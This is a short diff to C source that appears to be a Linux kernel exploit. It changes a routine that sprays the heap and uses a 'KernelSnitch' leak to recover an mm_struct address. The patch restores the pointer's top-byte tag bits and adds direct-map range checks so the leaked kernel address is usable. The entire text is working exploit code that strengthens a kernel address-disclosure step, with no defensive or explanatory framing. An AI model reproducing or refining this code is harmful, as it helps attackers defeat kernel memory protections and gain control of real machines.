@@ -568,8 +568,13 @@ uintptr_t prepare_kernel_page(void) {
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
           (size_t)ks->mm_struct, ms_since(&t_spray));
   uintptr_t leaked = ks->mm_struct;
+  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+  leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
-  if (leaked == (uintptr_t)-1) {
+  /* mm_structs live in the direct map */
+  if (leaked == (uintptr_t)-1 ||
+      leaked < KERNELSNITCH_IDENTITY_START ||
+      leaked >= DIRECT_MAP_END) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
